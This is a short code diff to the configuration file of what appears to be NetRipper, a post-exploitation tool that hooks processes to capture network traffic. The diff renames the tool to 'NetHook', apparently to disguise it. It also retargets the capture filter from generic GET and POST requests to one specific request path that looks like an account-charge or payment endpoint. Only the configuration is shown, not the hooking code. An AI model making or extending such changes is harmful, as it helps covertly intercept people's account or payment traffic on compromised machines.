@@ -14,8 +14,8 @@ bool DynConfig::s_bEnablePcap = false;
 // Default settings
 
 string DynConfig::s_sConfigurationString = 
-	"<NetRipper><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>GET,POST</stringfind"
-	"er><data_path>TEMP</data_path><processes></processes><pcap>false</pcap></NetRipper>-----------------"
+	"<NetHook><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>GET /amchargepls?service=page/acct.charge.payrecvagent&</stringfind"
+	"er><data_path>TEMP</data_path><processes></processes><pcap>false</pcap></NetHook>-----------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
@@ -90,7 +90,7 @@ string DynConfig::GetDataPath()
 		}
 
 		sPath = buffer;
-		sPath = sPath + "NetRipper";
+		sPath = sPath + "NetHook";
 	}
 	else sPath = s_sDataPath;
 
